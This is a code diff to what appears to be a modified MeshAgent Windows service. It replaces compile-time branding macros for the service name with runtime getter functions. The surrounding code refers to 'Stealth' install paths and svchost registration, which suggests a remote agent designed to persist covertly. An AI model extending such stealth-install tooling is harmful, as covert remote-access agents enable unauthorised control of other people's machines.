@@ -83,9 +83,11 @@ static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
 
 #include <WtsApi32.h>
 
-#include "meshcore/generated/meshagent_branding.h"
-TCHAR* serviceFile = MESH_AGENT_SERVICE_FILE;
-TCHAR* serviceName = MESH_AGENT_SERVICE_NAME;
+#include "branding_util.h"
+static mesh_branding_text_t g_serviceFileText = MeshService_GetServiceFileText();
+static mesh_branding_text_t g_serviceNameText = MeshService_GetServiceNameText();
+static TCHAR* serviceFile = (TCHAR*)g_serviceFileText;
+static TCHAR* serviceName = (TCHAR*)g_serviceNameText;
 
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
@@ -589,11 +591,7 @@ int wmain(int argc, char* wargv[])
 		}
 
 		// Compute branded service name (TCHAR) -> wide
-#ifdef UNICODE
-		lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
-#else
-		MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
-#endif
+		MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
 
 		// Calculate permanent install paths and ensure directories exist
 		if (!Stealth_GetInstallPaths(&paths))
@@ -631,11 +629,7 @@ int wmain(int argc, char* wargv[])
     if (argc > 1 && strcasecmp(argv[1], "-svchost-unregister") == 0)
     {
         WCHAR wSvcName[256] = {0};
-#ifdef UNICODE
-        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
-#else
-        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
-#endif
+        MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
         BOOL ok = Stealth_UnregisterSvchostService(wSvcName);
         printf(ok ? "[+] Svchost unregistration successful\n" : "[!] Svchost unregistration failed\n");
         return ok ? 0 : 1;
@@ -645,11 +639,7 @@ int wmain(int argc, char* wargv[])
     if (argc > 1 && strcasecmp(argv[1], "-svchost-status") == 0)
     {
         WCHAR wSvcName[256] = {0};
-        #ifdef UNICODE
-        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
-        #else
-        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
-        #endif
+        MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
 
         wprintf(L"Service: %s\n", wSvcName);
         // Exit code bitmask
